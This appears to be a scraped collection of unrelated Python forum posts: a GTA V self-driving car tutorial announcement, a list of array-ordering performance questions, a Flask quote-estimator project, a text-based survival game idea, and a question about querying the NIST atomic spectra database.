A careful review of configuration parameters for both Sanic and Reverse
Proxy (like NGINX) is also very important.

Using Python with mainly OpenCV so far, I've created a tutorial series of my experience getting Python to play Grand Theft Auto 5, with the main first project being to create a self-driving car.

This first batch of tutorials ends with us having a VERY crude self-driving scooter using very rudimentary techniques with OpenCV and purely visual data (no cheating and reading game engine information).

I plan to bring in deep learning in the coming tutorials to see just how far I can take this. 

This series is not too much beginner-friendly, but I try my best to link to beginner friendly tutorials for the topics I do cover, and you can ask questions anywhere if you're confused. It's also not planned out, I am filming as I go, so I make no promises that the paths we take will lead anywhere at all :)...but I can promise at least a very dangerous self-driving scooter. 

Along with the tutorials, I've started a github for the project, where other people can contribute ideas and improvements. 

Finally, it's not required you follow along with Grand Theft Auto V, any game where you drive and can clearly see lanes is do-able for a while at least until I am content with our self-driving car project and try something else in the game.

It started to work but I have to improve things:

1. If I order the array differently, I get different results. So I thing some result are missing. (thats why I repeat the display code 3 times without doing a function, to show this. But I want to remove the two last ones)
2. The execution time becomes long since I add some more input in array. Maybe this is not optimized and do too much operations. Maybe ordering before comparing and once the limit value as been reached pass to next item?
3. Ideally I liked to order my results but without adding too much execution time.
4. Some result appears multiple times (as second point I think some optimization is missing)

"I'm currently taking a class that is partnered up with sponsors (local non-profit businesses) to allow for hands-on projects. The project that my team and I have been assigned is a quote estimation system.

Essentially, I'm thinking about creating a web-based application that would allow the user to enter in values for the specified fields, do the math, and generate a PDF that the business could provide to clients. The idea seems simple, but I'm stumped on where to start. If you guys are interested in the specifics, it's a non-profit landscaping company.

This is what I have so far:

* Used Flask to create a series of HTML pages that has CSS
* Working log-in function

What I'm stuck on:

* How to approach everything..
   * How should the values be stored? In a database or CSV file?
   * How would the web form be created to ask for user input?
   * How would I be able to use the input from the webform, apply it to a template, and generate a PDF from it?

"I am very new to programming, however, I have this text-based game that I wish to create! I understand that most individuals that are new to programming start with an insane game that would take a massive team to create, and after they see the dedication that needs to exist for this game to become a reality, they see this as being underachieve, however, I have a way to compromise my inexperienced programming, I will create a text-based game!

This is create a game that is focused on survival upon a planet, as usual, I mean, everyone wishes to create that, however, it is more focused on creating items, to the point to which the game does not even have graphics. If you wish to speak about the game with me, private message me, and I will tell you more. However, just to start with an introduction, you can gather resources by launching commands, or selecting an option. You receive resources that you have no guide in to crafting anything with. You have to manage personal health, and you will be notified of hunger, thirst, lack of oxygen, and other events. This might not sound very interesting to some, however, imagine it this way, there are millions of combinations you can craft, there are hundreds of thousands different events and occurrences you can create, and there are new species you can examine, and a large amount more, I mean, actually a large amount more, except all of this is without any images, and in just text based, with possibly minor graphics.

I simply require some form of tutorials, even if those tutorials are videos on YouTube, or written by professional game creators, or those who have experience in creating games.

Also, I do not have a name for this, if you have any suggestions feel free to leave them in the comments, I care about completing the game, before naming it, I suppose.

"Hello fellow Python users! (Pythoneers? Pythonians? Pythonites?)

&#x200B;

Background: 

I am working on a project where I need to remotely access the NIST Atomic Spectra Database (ASD), or some derivative of it. Ideally, I will need to simply input a wavelength range, and get all emissions inside of that range, regardless of element, and also get the A\_ki (branching ratios), J (or g) \[angular momentum or statistical weight\], and the element that actually produces the emission (line name, like Aluminum I or iron II). Ideally I could download other properties, but these are the ones I actually need for my project.

&#x200B;

Current Work: 

I have thought of two ways to proceed in this problem. Either I could download the entire ASD and simply use a numpy import, or I could use a Python module to access the data on the web. Since I would really like to use a Python module, that is what I will focus on here. I have found the Astroquery module, and it has both the NIST database (astroquery.nist) itself, and it also accesses a derivative of NIST, the Atomic Line List (astroquery.atomic). For nist module, I will not always know the emissions I am looking for, and it returns an error whenever I run the command without the line name argument. I have been using the atomic module, but it has a limit of 500 rows of data per call (this limit is imposed by the database). Most of the time, I need more than 500 rows of data, and I can get around this by iterating in a WHILE loop. I have also found the ChiantiPy module, but it does not appear to have all the data I need.

&#x200B;

Solution: 

I believe I have my solution in the atomic module with a WHILE loop, but I would prefer an easier, less risky method. Ideally I could download the data I need all in one command, or import from a locally stored database. I need at minimum the variables I mentioned above (A\_ki, J or g, and the element). I believe I have found the best modules available for remotely accessing the data, but I would appreciate any input or recommendations you all have for me.
